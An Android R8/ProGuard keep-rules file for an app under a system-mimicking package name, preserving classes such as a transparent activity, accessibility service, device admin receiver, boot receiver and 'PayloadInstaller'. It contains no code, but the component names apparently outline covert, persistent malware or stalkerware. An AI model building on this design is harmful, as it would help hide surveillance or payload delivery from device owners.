# Manifest-referenced components must survive R8 renaming.
-keep class com.android.shell.ghost.MainActivity { *; }
-keep class com.android.shell.ghost.TransparentActivity { *; }
-keep class com.android.shell.ghost.GhostAccessibilityService { *; }
-keep class com.android.shell.ghost.GhostForegroundService { *; }
-keep class com.android.shell.ghost.BootReceiver { *; }
-keep class com.android.shell.ghost.PackageInstallReceiver { *; }
-keep class com.android.shell.ghost.GhostCleanupReceiver { *; }
-keep class com.android.shell.ghost.GhostDeviceAdmin { *; }
-keep class com.android.shell.ghost.PayloadInstaller { *; }

-keepclassmembers class * extends android.app.Service { *; }
-keepclassmembers class * extends android.content.BroadcastReceiver { *; }
-keepclassmembers class * extends android.app.admin.DeviceAdminReceiver { *; }
-keepclassmembers class * extends android.view.accessibility.AccessibilityService { *; }

-keepattributes Signature
-keepattributes *Annotation*
-dontwarn androidx.**
